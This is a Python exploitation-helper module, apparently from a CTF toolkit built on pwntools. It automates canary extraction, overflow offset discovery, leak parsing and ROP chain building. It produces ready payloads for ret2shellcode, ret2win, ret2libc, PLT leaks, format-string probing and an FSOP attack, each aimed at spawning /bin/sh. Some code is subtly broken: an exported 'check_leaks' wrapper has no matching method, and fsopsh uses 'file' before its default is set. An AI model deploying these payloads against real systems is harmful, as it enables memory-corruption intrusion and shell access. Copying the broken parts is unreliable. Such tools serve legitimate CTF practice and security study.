import math
import re
import os

from pwn import ELF, ROP, asm, context, cyclic, cyclic_find, log, shellcraft, flat
from pwnlib.rop.gadgets import Gadget

from pwninit.helpers.utils import u64, upack, encode
from pwninit.helpers.constants import *

class PwnContext:
    """A context class for managing pwn tools state, including IO, ELF, libc,
    and exploitation helpers.

    Attributes:
        io (IOContext): The IO context for interacting with the target.
        elf (ELF): The ELF binary being exploited.
        libc (ELF): The libc library being used.
        prefix (str): Prefix for sending/receiving data.
        _offset (int): Cached offset for buffer overflows.
        _canary (int): Cached canary value.
    """

    def __init__(self, io, elf, libc, libs=[], prefix=None):
        self.io = io
        self.elf = elf
        self.libc = libc
        self.libs = [ELF(l) for l in libs]
        self.prefix = prefix
        self._offset = None
        self._canary = None

    @property
    def canary(self):
        """Get the canary value for the current process.

        Returns:
            int: The canary value, or None if not found.
        """
        if self._canary: return self._canary
        if not self.elf.canary: log.warn("no canary in this binary"); return self._canary
        if not self.io.proc: log.warn("impossible to retrieve canary without local proc"); return self._canary

        auxv = open(f"/proc/{self.io.proc.pid}/auxv", "rb").read()
        word = context.bytes
        for i in range(0, len(auxv), 2 * word):
            a_type = u64(auxv[i : i + word])
            a_val = u64(auxv[i + word : i + 2 * word])
            if a_type == 25:  # AT_RANDOM
                self.canary = u64((b"\x00" + self.io.proc.readmem(a_val + 1, 7)))
                break

        return self._canary

    @canary.setter
    def canary(self, new_canary):
        self._canary = new_canary

    @property
    def offset(self):
        """Get the offset for buffer overflows by sending a cyclic pattern and
        analyzing the corefile.

        Returns:
            int: The offset value.
        """
        if self._offset: return self._offset

        context.delete_corefiles = True
        if hasattr(self.io, "sendline"):
            self.io.sendline(cyclic(1000))
        self.io.poll(block=True)
        core = self.io.corefile
        self._offset = cyclic_find(core.fault_addr)
        log.info(f"offset found: {self._offset}")
        return self._offset

    @offset.setter
    def offset(self, new_offset):
        """
        Get the offset for buffer overflows by sending a cyclic pattern and analyzing the corefile.

        Returns:
            int: The offset value.
        """
        self._offset = new_offset

    def __find_sym(self, symbol, bin_obj):
        if isinstance(symbol, int):
            return symbol
        elif "+" in symbol:
            func, off = symbol.split("+")
            return bin_obj.sym[func] + int(off, 0)
        elif "-" in symbol:
            func, off = symbol.split("-")
            return bin_obj.sym[func] - int(off, 0)
        else:
            return bin_obj.sym[symbol]

    def resolve(self, symbol):
        """
        Resolve a symbol to an address in either the ELF or libc.

        Args:
            symbol (str or int): The symbol name or address.

        Returns:
            int: The resolved address, or None if not found.
        """
        if isinstance(symbol, int):
            return symbol

        for b in [self.libc, self.elf] + self.libs:
            try:
                return self.__find_sym(symbol, b)
            except KeyError:
                pass

    def check_leak(self, leaked: int) -> tuple:
        """
        Check if a leaked value corresponds to a known memory region (e.g., libc, elf, canary).

        Args:
            leak (int): The leaked value.

        Returns:
            tuple: (name, base) where `name` is the region name and `base` is the base address.
        """
        if not self.io or not self.io.proc:
            return None, None

        if self.canary and hex(leaked) in hex(self.canary):
            return "canary", self.canary

        libs = self.io.libs()
        for m in self.io.maps():
            if not (m.start <= leaked <= m.end):
                continue

            name = os.path.basename(m.path[1:-1] if '[' in m.path else m.path).partition(".")[0]
            base = m.address 
            if m.path in libs:
                base = libs[m.path]
            return name, base

        return None, None


    def find_leak(self, buf:int|str|bytes) -> int:
        if isinstance(buf, int):
            return buf

        buf = encode(buf)
        if m := re.search(rb"0x[0-9a-fA-F]+", buf):
            leak_val = int(m.group(), 16)
        elif len(buf) <= 8:
            leak_val = upack(buf)
        else:
            buf = buf.rstrip(b"\n")
            for i in range(len(buf)):
                for j in range(6, 8):
                    l_val = upack(buf[i : i + j])
                    name, _ = self.check_leak(l_val)
                    if name:
                        log.info(f"[{name}]: leak[{i}:{i + j}]")
            log.warn("cannot find leak, try another way")
            exit(0) # early exit, we don't need to continue

        return leak_val

    def leak(self, leaked:int|str|bytes, offset=0, name=""):
        """
        Parse and log a memory leak, optionally assigning it to a context variable.

        Args:
            leak (bytes or str): The leaked data.
            leaked (int): Value to subtract from the leak.
            name (str): Name of the variable to assign the leak to (e.g., "libc", "elf").

        Returns:
            int: The parsed leak value.

        Example:

            >>> stack = leak(b'[LEAK] The address of cmd where you are writing to is: 0x7ffeab2e0b90')
            [*] [stack]: leak = 0x7ffc710958d0

            >> print(hex(stack))
            0x7ffc710958d0
        """
        base = 0
        leaked = self.find_leak(leaked) - offset

        if not name:
            name, base = self.check_leak(leaked)

        if base > 0 and leaked != base and name!='stack':
            log.info(f"[{name}]: leak = {leaked:#x}, base = {base:#x}, offset = {leaked - base}")
        elif name:
            log.info(f"[{name}]: {leaked:#x}")
        elif not self.io:
            log.info(f"leak = {leaked:#x}")
        else:
            log.warn("no leak found")

        return leaked

    def ropchain(self, chain, ret=True):
        """
        Generate a ROP chain for the specified chain of function calls.

        Args:
            chain (dict): A dictionary mapping function names to their arguments.
            ret (bool): If True, add a `ret` gadget at the start and end of the chain.

        Returns:
            bytes: The generated ROP chain.

        Example:

            >>> payload = ropchain({"shell": []}})
            [*] ROP :
                0x0000:        0x804835a ret
                0x0004:        0x8048516 shell()
                0x0008:        0x804835a ret
            >>> payload
            b'Z\\x83\\x04\\x08\\x16\\x85\\x04\\x08Z\\x83\\x04\\x08'
        """
        elfs = []
        if self.elf and (not self.elf.pie or self.elf.address):
            elfs.append(self.elf)

        if self.libc and (not self.libc.aslr or self.libc.address):
            elfs.append(self.libc)

        rop = ROP(elfs)
        if elfs and ret:
            rop.raw(rop.ret.address)

        for func, params in chain.items():
            if isinstance(func, str) and "+" in func:
                f, off = func.split("+")
                func = self.resolve(f) + int(off)

            if not isinstance(params, dict):
                rop.call(func, params)
                continue

            for value, gadget in rop.setRegisters(params):
                if isinstance(gadget, Gadget):
                    rop.raw(gadget)
                else:
                    rop.raw(value)

            rop.call(func)

        rop.raw(rop.ret.address)
        log.info(f"ROP :\n{rop.dump()}")
        return rop.chain()

    def bof(self, data, opt=None, bp=None, **kwargs):
        """
        Generate a buffer overflow payload with optional canary and base pointer.
        Canary and offset are set using ctx.offset and ctx.canary

        Args:
            data: The data to include in the payload.
            opt (dict): Optional overrides for specific offsets.
            bp: Base pointer value to include.
            **kwargs: Additional arguments for `flat`.

        Returns:
            bytes: The generated payload.

        Example:

            >>> ctx.offset = 128
            >>> bof(b'TEST')
            b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabTEST'
        """
        offset_val = self.offset
        canary_val = self.canary

        if opt is None:
            opt = {}

        if canary_val:
            opt |= {offset_val-context.bytes*2: canary_val}

        if bp:
            opt |= {offset_val-context.bytes: bp}

        return flat({offset_val: data} | opt, **kwargs)

    def ret2shellcode(self, addr: int|str, ret=True, **kwargs):
        """
        Generate a payload to return to shellcode at the specified address.

        Args:
            addr (int): The address of the shellcode.
            ret (bool): If ropchain adds a ret before the start of the rop
            **kwargs: Additional arguments for `bof`.

        Returns:
            bytes: The generated payload.

        Example:

            >>> ctx.offset = 128
            >>> payload = ret2shellcode(0x0)
            [*] Loaded 12 cached gadgets for './ch15'
            [*] ROP :
                0x0000:        0x804835a ret
                0x0004:             0x25 0x25()
                0x0008:        0x804835a ret
            >>> payload
            b'\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x81\\xec\\x00\\x10\\x00\\x00jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80gaabZ\\x83\\x04\\x08%\\x00\\x00\\x00Z\\x83\\x04\\x08'
        """
        addr = self.resolve(addr)
        shellcode = asm(shellcraft.sh())
        stub = (
            asm("sub esp, 0x1000")
            if context.bits == 32
            else asm("sub rsp, 0x1000")
        )
        shellcode = stub + shellcode
        padding_len = (
            self.offset
            - context.bytes * (self.elf.canary + 1)
            - len(shellcode)
        )
        padding = asm("nop") * padding_len
        addr += len(padding) // 2
        payload = self.ropchain({addr: []}, ret)
        return self.bof(payload, opt={0: [padding, shellcode]}, **kwargs)

    def ret2win(self, win, params=None, ret=True, **kwargs):
        """
        Generate a payload to call a `win` function with the specified parameters.

        Args:
            win (str or int): The `win` function name or address.
            params (list): Arguments to pass to the `win` function.
            ret (bool): If ropchain adds a ret before the start of the rop
            **kwargs: Additional arguments for `bof`.

        Returns:
            bytes: The generated payload.
        """
        if params is None:
            params = []
        addr = self.resolve(win)
        payload = self.ropchain({addr: params}, ret)
        return self.bof(payload, **kwargs)

    def ret2libc(self, ret=True, **kwargs):
        """
        Generate a payload to call `system("/bin/sh")` using libc.

        Args:
            ret (bool): If ropchain adds a ret before the start of the rop

        Returns:
            bytes: The generated payload.
        """
        system = self.libc.sym["system"]
        payload = self.ropchain({system: [self.binsh()]}, ret)
        return self.bof(payload, **kwargs)

    def ret2plt(self, func="puts", ret2main="main", ret=True, **kwargs):
        """
        Generate a payload to leak a libc address using the PLT.

        Args:
            func (str): The function to leak (default: "puts").
            ret2main (str): The function to return to after leaking (default: "main").
            ret (bool): If ropchain adds a ret before the start of the rop
            **kwargs: Additional arguments for `bof`.
        """
        func_plt = self.elf.plt[func]
        func_got = self.elf.got[func]
        if ret2main:
            main_addr = self.resolve(ret2main)
            payload = self.ropchain({func_plt: [func_got], main_addr: []}, ret)
        else:
            payload = self.ropchain({func_plt: [func_got]}, ret)
        self.bof(payload, **kwargs)
        leak_val = upack(self.io.recv())
        self.libc.address = leak_val - self.libc.sym[func]

    def format_string(self, n=100):
        """
        Exploit a format string vulnerability to leak memory.

        Args:
            n (int): Number of `%p` placeholders to include in the payload.

        Returns:
            int: The index of the payload in the output.
        """
        payload = "A" * context.bytes + ".%p" * n
        self.io.send(payload)
        output = self.io.recv().split(b".")
        log.info(f"format string : {output}")
        ascii_hex_target = "0x" + "41" * context.bytes
        return output.index(ascii_hex_target.encode())

    def fsopsh(
        self,
        func=None,
        arg=b"/bin/sh\0",
        file=None,
        trigger=XSPUTN,
        lock=None,
        chain=None,
    ):
        """
        Generate a fsop payload to call a function (usually system("/bin/sh"))

        Arguments:
            func(int): Address of the function to be called, libc's system by default
            arg(bytes): First argument of the call, /bin/sh by default
            file(int): Address of the file structure, libc's stdout by default
            trigger(int): Vtable entry to trigger call on, XSPUTN by default
            lock(int): Value to put as lock (an empty zone), file+0x800 by default

        Example:

            >>> fsopsh()
            b'\\x01\\x01\\x01\\x01\\x01\\x01\\x01;/bin/sh\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\xfb\\xd1\\r\\xadU\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\xf3\\xd1\\r\\xadU\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x90\\xb2d\\xf9\\x08\\x7f\\x00\\x00@\\x1f~\\xf9\\x08\\x7f\\x00\\x00x\\xf3\\xd1\\r\\xadU\\x00\\x00'
        """

        func = func or self.libc.sym.system
        lock = lock or file + 0x800
        file = file or self.libc.sym._IO_2_1_stdout_

        return flat(
            {
                0x00: [0x3B01010101010101, arg],
                0x68: chain if chain else 0x0,
                0x78: -1,
                0x88: lock,  # empty zone as lock
                0x90: -1,
                0xA0: file,  # wide_data
                0xD0: func,
                0xD8: self.libc.sym["_IO_wfile_jumps"]
                - (trigger - OVERFLOW),  # vtable
                0xE0: file + (0xD0 - 0x68),  # wide_data->vtable,
            },
            filler=b"\0",
        )

    def binsh(self):
        """
        Find the address of `/bin/sh` in libc.

        Returns:
            int: The address of `/bin/sh`.
        """
        return next(self.libc.search(b"/bin/sh\0"))


pwnctx = None

def set_ctx(new_ctx: PwnContext):
    global pwnctx
    pwnctx = new_ctx

def _require_ctx():
    if pwnctx is None:
        raise RuntimeError("PwnContext not initialized — call set_ctx() first")


def _ctx(name):
    def wrapper(*args, **kwargs):
        _require_ctx()
        return getattr(pwnctx, name)(*args, **kwargs)

    wrapper.__name__ = name
    return wrapper

leak = _ctx("leak")
resolve = _ctx("resolve")
check_leaks = _ctx("check_leaks")
ropchain = _ctx("ropchain")
bof = _ctx("bof")
ret2shellcode = _ctx("ret2shellcode")
ret2win = _ctx("ret2win")
ret2libc = _ctx("ret2libc")
ret2plt = _ctx("ret2plt")
format_string = _ctx("format_string")
fsopsh = _ctx("fsopsh")
binsh = _ctx("binsh")
